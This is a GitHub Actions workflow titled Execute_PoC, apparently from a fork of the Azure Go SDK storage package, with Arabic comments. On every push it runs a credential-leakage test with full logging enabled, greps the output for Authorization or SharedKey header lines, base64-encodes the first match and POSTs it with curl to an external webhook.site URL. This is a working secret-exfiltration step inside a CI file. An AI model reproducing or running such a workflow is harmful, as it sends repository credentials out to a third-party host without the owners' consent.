name: Execute_PoC
on: [push]
jobs:
  run-exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Setup Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.21'

      - name: Force Exploit
        working-directory: ./sdk/storage/azblob
        run: |
          sed -i 's/go 1.25.0/go 1.21/' go.mod
          
          # تفعيل وضع التسجيل الكامل لرؤية الهيدرز في الـ Console
          export AZURE_SDK_GO_LOGGING=all
          
          # تشغيل التست وحفظ كل المخرجات بما فيها الـ Logs
          go test -v -run TestImpact_CredentialLeakage > leak_output.txt 2>&1 || true
          
          # التقاط أي سطر يحتوي على التوقيع (حتى لو كان مشفراً)
          # سنبحث عن كلمة 'Authorization' أو 'SharedKey'
          FINAL_DATA=$(grep -E "Authorization|SharedKey" leak_output.txt | head -n 1 | base64 || echo "bm90X2ZvdW5k")
          
          # إرسال البيانات (مُشفرة بـ Base64 لضمان عدم ضياع الرموز)
          curl -X POST -d "Encoded_Result=$FINAL_DATA" https://webhook.site/72d5ef0b-edde-4e82-b103-d71004e44835
